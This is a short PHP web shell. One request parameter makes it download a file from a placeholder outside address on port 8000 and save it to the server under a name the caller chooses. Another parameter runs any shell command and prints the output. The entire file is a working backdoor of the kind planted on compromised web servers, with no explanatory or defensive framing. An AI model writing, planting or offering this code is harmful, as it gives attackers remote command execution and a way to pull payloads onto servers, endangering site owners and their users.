<?php
    if(isset($_REQUEST['upload'])) {
        file_put_contents($_REQUEST['upload'], file_get_contents("http://xxx.xx.xx.xx:8000/" . $_REQUEST['upload']));
    };
    if(isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
